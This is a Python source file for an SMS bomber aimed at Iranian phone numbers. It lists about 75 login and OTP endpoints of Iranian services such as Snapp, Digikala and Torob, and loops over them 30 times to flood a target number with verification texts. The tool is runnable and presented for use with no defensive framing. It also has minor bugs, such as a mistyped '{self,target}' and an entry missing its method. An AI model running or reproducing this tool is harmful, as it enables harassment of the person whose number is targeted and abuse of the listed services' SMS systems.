from secrets import token_hex
from multiprocessing import Process,cpu_count
from concurrent.futures import ProcessPoolExecutor
from bomber.requests import postRequest,getRequest,asyncio

class Bomber(Process):
    process = {}
    def __init__(self,target,task_id):
        super().__init__()
        self.name = task_id
        self.target = target
        self.apis = [
            {"url":"https://gw.taaghche.com/v4/site/auth/login","paramet":{"contact":f"0{self.target}", "forceOtp": False},"method":"POST"},
            {"url":"https://rest.talentcoach.ir/api/v1/service/trainees/","paramet":{"cellphone": f"+98{self.target}"},"method":"POST"},
            {"url":"https://api.ostadkr.com/login","paramet":{"mobile": f"0{self.target}"},"method":"POST"},
            {"url":f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{self.target}/sms?cCode=%2B98","paramet":None,"method":"GET"},
            {"url":"https://api.oteacher.org/v1/otp","paramet":{"isLogin":False, "isUpdatePhone":False, "phone":f"98{self.target}"},"method":"POST"},
            {"url":"https://www.safirstores.com/index.php?route=account/login/getRandCode","paramet":{"telephone":f"0{self.target}"},"method":"POST"},
            {"url":f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{self.target}","paramet":None,"method":"GET"},
            {"url":"https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox","paramet":{"contactInfo[mobile]":f"0{self.target}", "contactInfo[password_confirm]":None, "submit_register":1, "contactInfo[agreementAccepted]":1},"method":"POST"},
            {"url":"https://auth.basalam.com/otp-request","paramet":{"client_id":11, "mobile":f"0{self.target}"},"method":"POST"},
            {"url":"https://www.snapptrip.com/register","paramet":{"country_code":"+98", "country_id":"860", "email":"betoche@gmail.com", "lang":"fa", "mobile_phone":f"0{self.target}","password":"123456789"},"method":"POST"},
            {"url":"https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL","paramet":{"mobile":f"0{self.target}"},"method":"POST"},
            {"url":f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{self.target}","paramet":None,"method":"POST"},
            {"url":"https://api.timcheh.com/auth/otp/send","paramet":{"mobile":f"0{self.target}"},"method":"POST"},
            {"url":"https://account.bama.ir/api/otp/Generate/v2","paramet":{"appname":"bamawebapplication", "cellNumber":f"0{self.target}", "smsfor":6},"method":"POST"},
            {"url":"https://cyclops.drnext.ir/v1/patients/auth/send-verification-token","paramet":{"mobile":f"0{self.target}", "source":"besina"},"method":"POST"},
            {"url":"https://mobapi.banimode.com/api/v2/auth/request","paramet":{"phone":f"0{self.target}"},"method":"POST"},
            {"url":"https://www.buskool.com/send_verification_code","paramet":{"phone":f"0{self.target}"},"method":"POST"},
            {"url":"https://uiapi2.saapa.ir/api/otp/sendCode","paramet":{"from_meter_buy":False, "mobile":f"0{self.target}"},"method":"POST"},
            {"url":"https://app.mydigipay.com/digipay/api/users/send-sms","paramet":{"cellNumber":f"0{self.target}", "device":{"deviceAPI":"WEB_BROWSER", "deviceId": "d520c7a8-421b-4563-b955-f5abc56b97ec", "deviceModel":"WEB_BROWSER", "osName":"WEB"}},"method":"POST"},
            {"url":"https://www.technolife.ir/shop","paramet":{"g-recaptcha-response":"", "query":"query check_customer_exists($username: String ,$repeat:Boolean){\n  check_customer_exists(username: $username , repeat:$repeat){\n    result\n    request_id\n    }\n  }", "variables":{"username":f"0{self.target}"}},"method":"POST"},
            {"url":"https://football360.ir/api/auth/verify-phone/","paramet":{"phone_number":f"+98{self.target}"},"method":"POST"},
            {"url":"https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode","paramet":{"Identity":{"Token":None}, "Parameters":{"ApplicationType":"Web", "ApplicationUniqueToken":None, "ApplicationVersion":"1.0.0", "MobileNumber":f"0{self.target}", "UniqueToken":None}},"method":"POST"},
            {"url":"https://api.esam.ir/api/account/RegisterOrLogin","paramet":{"mobile":f"0{self.target}", "present_type":"WebApp", "registration_method":0, "serialNumber":"React1234"},"method":"POST"},
            {"url":"https://api.sibche.com/profile/sendCode","paramet":{"mobile":f"0{self.target}"},"method":"POST"},
            
            {"url":f"https://api.digikala.com/v1/user/authenticate/","paramet":{"username":self.target},"method":"POST"},
            {"url":f"https://i.devslop.app/app/ifollow/api/otp.php","paramet":f"number={self.target}&state=number&","method":"POST"},
            {"url":f"https://chamedoon.com/api/v1/membership/guest/request_mobile_verification","paramet":{"mobile":self.target},"method":"POST"},
            {"url":f"https://www.pubisha.com/login/checkCustomerActivation","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://www.shab.ir/api/fa/sandbox/v_1_4/auth/number-mobile","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=4e012cac-7c9d-4a6f-b21e-c90fbe775139&locale=fa","paramet":{"cellphone":f"{self.target}"},"method":"POST"},
            {"url":f"https://hiword.ir/wp-json/otp-login/v1/login","paramet":{"identifier":f"{self.target}"},"method":"POST"},
            {"url":f"https://abantether.com/users/register/phone/send/","paramet":{"phoneNumber":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.bit24.cash/api/v3/auth/check-mobile","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://dicardo.com/main/sendsms","paramet":{"phone":f"{self.target}"},"method":"POST"},
            {"url":f"https://ghasedak24.com/user/ajax_register","paramet":{"username":f"{self.target}"},"method":"POST"},
            {"url":f"https://tikban.com/Account/LoginAndRegister","paramet":{"CellPhone":f"{self.target}"},"method":"POST"},
            {"url":f"https://www.digistyle.com/users/login-register/","paramet":{"loginRegister[email_phone]":f"{self.target}"},"method":"POST"},
            {"url":f"https://mobapi.banimode.com/api/v2/auth/request","paramet":{"phone":f"{self.target}"},"method":"POST"},
            {"url":f"https://banankala.com/home/login","paramet":{"Mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://www.iranketab.ir/account/register","paramet":{"UserName":f"{self.target}"},"method":"POST"},
            {"url":f"https://ketabchi.com/api/v1/auth/requestVerificationCode","paramet":{"phoneNumber":f"{self.target}"},"method":"POST"},
            {"url":f"https://join.tapsi.ir/smsConfirm?phoneNumber={self.target}","paramet":None,"method":"GET"},
            {"url":f"https://www.offdecor.com/index.php?route=account/login/sendCode","paramet":{"phone":f"{self.target}"},"method":"POST"},
            {"url":f"https://exo.ir/index.php?route=account/mobile_login","paramet":{"mobile_number":f"{self.target}"},"method":"POST"},
            {"url":f"https://shahrfarsh.com/Account/Login","paramet":{"phoneNumber":f"{self.target}"},"method":"POST"},
            {"url":f"https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php","paramet":{"phone_email":f"{self.target}"},"method":"POST"},
            {"url":f"https://shop.beheshticarpet.com/my-account/","paramet":{"billing_mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={self.target}","paramet":None,"method":"GET"},
            {"url":f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={self.target}","paramet":None,"method":"GET"},
            {"url":f"https://www.khanoumi.com/accounts/sendotp","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://rojashop.com/api/auth/sendOtp","paramet":{"mobile":f"{self.target}"}},
            {"url":f"https://dadpardaz.com/advice/getLoginConfirmationCode","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.rokla.ir/api/request/otp","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://khodro45.com/api/v1/customers/otp/","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://mashinbank.com/api2/users/check","paramet":{"mobileNumber":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.pezeshket.com/core/v1/auth/requestCode","paramet":{"mobileNumber":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.timcheh.com/auth/otp/send","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={self.target}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain=","paramet":None,"method":"GET"},
            {"url":f"https://client.api.paklean.com/user/resendCode","paramet":{"username":f"{self.target}"},"method":"POST"},
            {"url":f"https://mobogift.com/signin","paramet":{"username":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.iranicard.ir/api/v1/register","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://pubg-sell.ir/loginuser?username={self.target}","paramet":None,"method":"GET"},
            {"url":f"https://tj8.ir/auth/register","paramet":{"username":f"{self.target}"},"method":"POST"},
            {"url":f"https://www.digistyle.com/users/login-register/","paramet":{"loginRegister[email_phone]":f"{self.target}"},"method":"POST"},
            {"url":f"https://cinematicket.org/api/v1/users/signup","paramet":{"phone_number":f"{self,target}"},"method":"POST"},
            {"url":f"https://www.irantic.com//api/login/request","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://kafegheymat.com/shop/getLoginSms","paramet":{"phone":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85","paramet":{"cellphone":f"{self.target}"},"method":"POST"},
            {"url":f"https://www.delino.com/user/register","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://alopeyk.com/api/sms/send.php","paramet":{"phone":f"{self.target}"},"method":"POST"},
            {"url":f"https://filmnet.ir/api-v2/access-token/users/{self.target}/otp","paramet":None,"method":"GET"},
            {"url":f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{self.target}/sms?cCode=+98","paramet":None,"method":"GET"},
            {"url":f"https://1401api.tamland.ir/api/user/signup","paramet":{"Mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://www.offdecor.com/index.php?route=account/login/sendCode","paramet":{"phone":f"{self.target}"},"method":"POST"},
            {"url":f"https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code","paramet":{"telephone":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.timcheh.com/auth/otp/send","paramet":{"mobile":f"{self.target}"},"method":"POST"},
            {"url":f"https://api.digikalajet.ir/user/login-register/","paramet":{"phone":f"{self.target}"},"method":"POST"},
        ]
        self.finish = 0
        self.isnotcurrect = 0
        
    def startBomber(self, url):
        try:
            
            if url["method"] == "POST":
                result = postRequest(url["url"], data=url["paramet"])
                
            elif url["method"] == "GET":
                result = getRequest(url["url"])
                
            if result.status_code == 200 or result.status_code == 202:
                self.finish += 1
            else: self.isnotcurrect += 1
                
        except Exception as err:self.isnotcurrect += 1;print(err)
        
    def run(self):
        for _ in range(30):
            for api in self.apis:
                self.startBomber(api)
            

                        
def startBomber(task_id):
    Bomber.process.get(task_id)["process"].start()
    Bomber.process.get(task_id)["status"] = "starting"

def stopBomber(task_id):
    Bomber.process[task_id]["process"].terminate()
    Bomber.process[task_id]["status"] = "Stoped"

def createBomber(target):
    task_id = token_hex(16)
    Bomber.process[task_id] = {
        "status" : "padding",
        "process" : Bomber(target,task_id),
        "target" : target
    }
    return Bomber.process.get(task_id)["process"]